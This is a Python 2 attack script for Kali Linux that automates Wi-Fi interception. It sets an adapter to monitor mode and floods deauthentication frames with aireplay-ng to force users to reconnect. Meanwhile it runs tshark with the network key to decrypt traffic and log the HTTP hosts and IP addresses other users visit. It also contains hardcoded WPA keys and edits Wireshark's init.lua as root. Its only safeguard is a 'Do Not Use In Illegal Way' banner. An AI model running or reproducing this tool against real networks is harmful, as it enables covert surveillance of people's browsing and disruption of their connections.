#!/usr/bin/env python
#coding:utf-8

#Programmer:Ultrapolar Moon Fox
#Date: Thursday 2 Jun 2016
#version 0.8.3G
##############################
#optimize:more details
##############################

import os
import sys
import time
import subprocess
import multiprocessing

W = '\033[0m'    # white (normal)
R = '\033[31m'   # red
G = '\033[32m'   # green
O = '\033[33m'   # orange
B = '\033[34m'   # blue
P = '\033[35m'   # purple
C = '\033[36m'   # cyan
GR = '\033[37m'  # gray
T = '\033[93m'   # tan

def tshark(interval,enc):
    print ("star tshark")
    time.sleep(5)
    os.system(enc)
    time.sleep(interval)
    print ("\nend tshark\n")

def aireplay(interval):
    print "start aireplay"
    i=0
    while i<2:
        os.system('aireplay-ng -0 5 -e '+ essid + " " + wlancard_name.lower().strip())
        time.sleep(9)
        i=i+1
        os.system('airmon-ng check kill')
    print "\nend aireplay"


#Main function
if __name__ == "__main__":
    while True:

        os.system('clear')

        #Related version imformation
        print ( T + '*' + W )*101
        print ( "This program used to capture users network information in wlan")
        print ( "             " + R + 'Do Not Use In Illegal Way !' + W )
        print ( T + '*' + W )*101
        time.sleep(3)

        print ("---------------------------------------------------------------------------------------")
        print ("Testing on: \tLinux 4.3.0-kali1-amd64, \n\t\tWireshark 2.0.2, \n\t\tlibpcap version 1.7.4, \n\t\tGcrypt 1.6.5, \n\t\tPython 2.7.11+, \n\t\tgcc 5.3.1 20160224.\n")
        time.sleep(5)

        #Choose wireless adaptor
        print ("---------------------------------------------------------------------------------------")
        print ('[' + T + '*' + W + '] ' "Current wireless adaptor list as follows:\n")
        os.system('iwconfig')
        time.sleep(3)
        print ("---------------------------------------------------------------------------------------")
        wlancard_name = raw_input('[' + B + '>' + W + ']' "Input wireless adaptor name selected: ")
        print ('\n')

        #Related Set 
        print ("---------------------------------------------------------------------------------------")
        print ('[' + T + '*' + W + '] ' "Doing Some Related Set...")
        time.sleep(3)
        print ("\n")
        os.system('ifconfig ' + wlancard_name.lower().strip() + ' down')
        os.system('iwconfig ' + wlancard_name.lower().strip() + ' mode monitor')
        os.system('ifconfig ' + wlancard_name.lower().strip() + ' up')
        f = open("/usr/share/wireshark/init.lua",'r+')
        change = f.readlines()
        change[652] = '--dofile(DATA_DIR.."console.lua")'
        f = open("/usr/share/wireshark/init.lua",'w+')
        f.writelines(change)
        f.close()

        os.system('iwconfig ' + wlancard_name.lower().strip())
        while True:
            print ("---------------------------------------------------------------------------------------")
            input = raw_input('[' + G + '?' + W + ']' "Set Over, Check Set Result Mode:monitor? [y/n]")
            if input.lower().strip() == "n":
                print ('[' + R + '!' + W + ']' "Wireless adaptor not support!")
                sys.exit()
            else:
                break

        #while True:
        #Show AP information arounded
        print ('\n')
        print ('[' + T + '*' + W + ']' "There will show the AP information arounded, press Ctrl-c to stop")
        time.sleep(5)
        os.system('airodump-ng ' + wlancard_name.lower().strip())

        #Use Tshark to capture packets and decrypted as well as run aireplay-ng to make users reconnect
        print('[' + T + '*' + W + ']' "Choose the Wi-Fi want to monitored\n")
        channel_num = raw_input('[' + B + '>' + W + ']' "Input channel number of the AP which choosed:")
        filename = raw_input('[' + B + '>' + W + ']' "Name the file to save capture datas:")
        essid = raw_input('[' + B + '>' + W + ']' "Input the AP essid :")
        password = raw_input('[' + B + '>' + W + ']' "Input the AP password(no password press enter directly) :")

        #Change wireless adopter channel
        os.system('airodump-ng -c ' + channel_num  + ' --essid ' + essid + ' ' + wlancard_name.lower().strip())

        time_capture = raw_input('[' + B + '>' + W + ']' "Input capture time (seconds):")

        b0 = '''sudo tshark -i ''' +wlancard_name.lower().strip()+ ''' -Y "http.host && ip" -T fields -e frame.number -e frame.time -e http.host -e ip.src -e ip.dst -E separator=/t/t/t -a duration:'''+time_capture+'> '+filename+".txt"
        b1 = '''sudo tshark -i ''' +wlancard_name.lower().strip()+ ''' -o wlan.enable_decryption:TRUE -o 'uat:80211_keys:\"wpa-pwd\",\" hhxxrhfnysw:BQXTD\"' -Y "http.host && ip" -T fields -e frame.number -e frame.time -e http.host -e ip.src -e ip.dst -E separator=/t -a duration:'''+time_capture+'> '+filename+".txt"
        b2 = '''sudo tshark -i ''' +wlancard_name.lower().strip()+ ''' -o wlan.enable_decryption:TRUE -o 'uat:80211_keys:\"wpa-pwd\",\" '''+password+':'+essid+'''\"' -Y "http.host && ip" -T fields -e frame.number -e frame.time -e http.host -e ip.src -e ip.dst -E separator=/t -a duration:'''+time_capture+'> '+filename+".txt"
        b3 = '''sudo tshark -i ''' +wlancard_name.lower().strip()+ ''' -o wlan.enable_decryption:TRUE -o 'uat:80211_keys:\"wpa-psk\",\" cb91f86262f1d56baad695091487e40322f601ae0914803cd785dbe11829373f\"' -Y "http.host && ip" -T fields -e frame.number -e frame.time -e http.host -e ip.src -e ip.dst -E separator=/t -a duration:'''+time_capture+'> '+filename+".txt"

        while True:
            encrypt = raw_input('[' + B + '>' + W + ']'"Input the AP encryption mode : (None \ WEP \ WPA \ WPA2)")
            if encrypt.lower().strip() == "none":  
                enc = b0
                break
            elif encrypt.lower().strip() == "wep":
                enc = b1
                break
            elif encrypt.lower().strip() == "wpa":
                enc = b2
                break
            elif encrypt.lower().strip() == "wpa2":
                enc = b2
                break
            else:
                print ("Wrong Input!\n")
        while True:
            print ('[' + T + '*' + W + ']' "Captuer time: " +time_capture+ "s")
            p1 = multiprocessing.Process(target = tshark, args = (30,enc))
            p2 = multiprocessing.Process(target = aireplay, args = (100,))
            p2.start()
            p1.start()
            p1.join()

            #Saved the result and display
            print ('[' + T + '*' + W + ']' "To view the user's HTTP URL please open the file :" +filename+ ".txt (/root/" +filename+ ".txt).\n")
            time.sleep(10)
            print ('[' + T + '*' + W + ']' "Show the saved content as follows:\n")
            print ("Frame\t\t\tTime\t\t\t\thttp\t\t\tsrc\t\tdst\n")
            os.system("cat "+filename+".txt")

            input = raw_input('[' + G + '?' + W + ']' "Capture over! Would you want to capture contiue? [y/n]")
            if input.lower().strip() == "n":
                break
        input = raw_input('[' + G + '?' + W + ']' "Program over! Would you want to run the script again? [y/n]")
        if input.lower().strip() == "n":
            sys.exit()     
